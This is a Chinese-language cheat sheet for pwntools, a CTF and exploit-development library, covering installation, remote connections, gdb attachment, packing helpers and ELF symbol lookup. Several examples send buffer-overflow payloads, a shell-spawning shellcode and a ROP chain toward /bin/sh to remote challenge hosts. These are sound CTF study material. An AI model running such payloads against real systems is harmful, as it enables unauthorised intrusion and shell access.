# pwntools

Pwntools 是一个CTF框架和漏洞利用开发库，使用Python编写，专为快速原型设计和开发而设计，旨在使漏洞利用编写尽可能简单。  

github地址: https://github.com/Gallopsled/pwntools  
官方文档: http://docs.pwntools.com/  


## 安装
建议的系统：  
```r
64-bit Ubuntu LTS releases (14.04, 16.04, 18.04, and 20.04)
```

安装命令：  
```r
sudo apt-get update
sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
```


## 使用
官方说明例子：  
```python
from pwn import *
context(arch = 'i386', os = 'linux')

r = remote('exploitme.example.com', 31337)
# EXPLOIT CODE GOES HERE
r.send(asm(shellcraft.sh()))
r.interactive()
```

例子2：  
```python
from pwn import *

pwn = remote('118.193.194.73',10000)

#  sh = process('/bin/sh') # 本地调试

pwn.recvuntil('let\'s begin!\n')

payload = ''
payload += 'a'*112
payload += p32(0x0804865D)

pwn.sendline(payload)

pwn.interactive()
```

例子3：  
```python
# remote.py
"""
Example showing how to use the remote class.
"""

from pwn import *   # 也可以直接   import pwn

sock = remote('127.0.0.1', 9001)     # 连接远程服务

print sock.recvline()           #  接收一行
sock.recvuntil("hello")          # 直到接收到某字符串
sock.recv()          # 接收就对了
sock.send('foo')                 #  发送消息
sock.interactive()               #  进入交互模式
```

例子4：  
```python
# coding:utf8

from pwn import *

conn = remote('pwnable.kr',9000)
#conn = process("./bof")                   # 这样可以本地调试

payload = 'a'*52 + p32(0xcafebabe)    

conn.sendline(payload)
conn.interactive()
```


## 一些点

### 附加gdb调试
http://docs.pwntools.com/en/stable/gdb.html#member-documentation  
如果执行脚本参数有'G'，就附加gdb，进行调试  
```r
if args.G:
    gdb.attach(conn, 'b * 0x0804868F')
```

一个附加调试脚本示例：  
```python
# Start a process
bash = process('bash')

# Attach the debugger
gdb.attach(bash, '''
set follow-fork-mode child
break execve
continue
''')

# Interact with the process
bash.sendline('whoami')
```

### 区分本地调试或远程利用
如果执行脚本参数有"REMOTE"，进行远程利用，否则本地调试  
```python
if args['REMOTE']:
    io = remote('exploitme.com', 4141)
else:
    io = process('./pwnable')
```

### 接收某数据后发送
```python
conn.sendafter('Hello', payload)  # 接收到"Hello"之后就发送
conn.sendlineafter('Hello', Payload)  # 会带回车
```

### 汇编反汇编
```python
asm('mov eax, 0')
disasm('\xb8\x00\x00\x00\x00')
```

### 生成shellcode
```python
asm(shellcraft.sh())
```

### 数据互转
```python
# 将数字地址转成64位小端数据
p64(0x12345678)
# 将小端数据转为数字地址，举一反三 32/16/8
u64()
```

### 设置合适的参数
```python
context.binary = './challenge-binary'
```

### 生成ELF对象，方便查看各种表的信息
```python
ELF('./challenge-binary')
```

### 获取函数地址
```python
get_shell = ELF('./challenge-binary').sym['getshell']
# sym是symbols的别名，所以 .symbols是全称
```

### 组合元素
默认是4个字节的小段序，可以设置  
```python
flat(['a' * 0x70, pop_eax_ret_addr, 0xb, pop_edx_ecx_ebx_ret_addr, 0, 0, bin_sh_addr, int_addr])
```

### 接收数据换行问题
对于recvuntil、sendlineafter这样的需要接收到指定数据再执行后续操作的函数，  
如果想接收的数据没有换行，可能会因为接收不到数据而卡死  
如: https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/oreo  


---
2017/9/2  
